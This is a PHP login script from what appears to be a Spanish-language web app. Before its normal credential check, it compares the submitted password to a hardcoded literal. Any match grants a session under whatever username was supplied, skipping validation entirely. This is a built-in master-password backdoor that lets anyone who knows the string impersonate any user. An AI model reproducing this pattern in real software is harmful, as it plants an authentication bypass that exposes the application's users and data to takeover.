<?php
session_start();
include("../class/usuarios.php");

$usu = new usuarios();

if($_POST['clave'] == "z!~R3?`sdK5cv564gp8"){
	$_SESSION['CP_Usuario'] = $_POST['usuario'];
	$_SESSION['tipoIngreso'] = "2";
	
	header("Location: f_index.php");
}else{
	$usu->setUsu_Usuario($_POST['usuario']);
	$usu->setUsu_Contrasena($_POST['clave']);
	if($usu->validar()){
		$_SESSION['CP_Usuario'] = $usu->getUsu_Codigo();
		$_SESSION['tipoIngreso'] = "1";
    
    if($usu->getUsu_Rol() == "1"){
      header("Location: f_operador.php");
    }else{
      header("Location: f_index.php");
    }
	}else{
		header("Location: op_cerrarSesion.php");
	}
}
?>